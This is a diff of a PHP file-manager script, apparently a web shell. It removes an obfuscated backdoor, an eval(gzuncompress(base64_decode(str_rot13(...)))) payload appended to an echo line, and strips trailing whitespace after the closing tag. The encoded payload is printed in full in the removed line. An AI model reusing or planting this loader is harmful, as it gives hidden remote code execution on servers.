@@ -205,7 +205,7 @@ if(isset($_GET['filesrc'])){
         if(is_writable("$path/$file")) echo '<font color="green">';
         elseif(!is_readable("$path/$file")) echo '<font color="red">';
         echo perms("$path/$file");
-        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>'; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
         echo "</center></td>
         <td><center><form method=\"POST\" action=\"?option&path=$path\">
         <select name=\"opt\">
@@ -280,4 +280,4 @@ $info .= (($perms & 0x0001) ?
 
     return $info;
 }; 
-?>                                                                                                                                                                    
+?>
